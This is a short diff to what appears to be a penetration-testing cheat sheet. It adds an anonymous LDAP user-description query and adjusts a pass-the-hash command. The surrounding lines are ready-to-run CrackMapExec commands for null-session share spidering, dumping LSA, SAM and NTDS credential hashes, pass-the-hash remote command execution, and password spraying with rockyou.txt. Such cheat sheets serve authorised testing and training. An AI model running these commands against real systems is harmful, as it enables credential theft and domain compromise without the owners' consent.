@@ -133,6 +133,7 @@ $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=fals
 $ crackmapexec smb <RHOST> -u " " -p "" --shares
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+$ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
@@ -141,7 +142,7 @@ $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
-$ crackmapexec smb <RHOST> -u <USERNAME> -H <HASH> -x "whoami"
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
 $ crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
 $ crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 $ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
